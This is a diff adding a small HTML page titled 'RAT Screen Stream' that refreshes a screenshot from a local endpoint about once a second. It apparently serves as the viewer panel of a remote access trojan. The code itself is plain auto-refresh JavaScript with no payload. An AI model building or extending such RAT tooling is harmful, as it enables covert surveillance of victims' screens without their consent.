@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RAT Screen Stream</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #refresh-img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+    <script>
+        function refreshImage() {
+            var image = document.getElementById('refresh-img');
+            var timestamp = new Date().getTime();
+            image.src = './getScreenshot?' + timestamp;
+        }
+
+        setInterval(refreshImage, 1050);
+    </script>
+</head>
+<body>
+    <img id="refresh-img" src="./getScreenshot" alt="Refreshed Image">
+</body>
+</html>
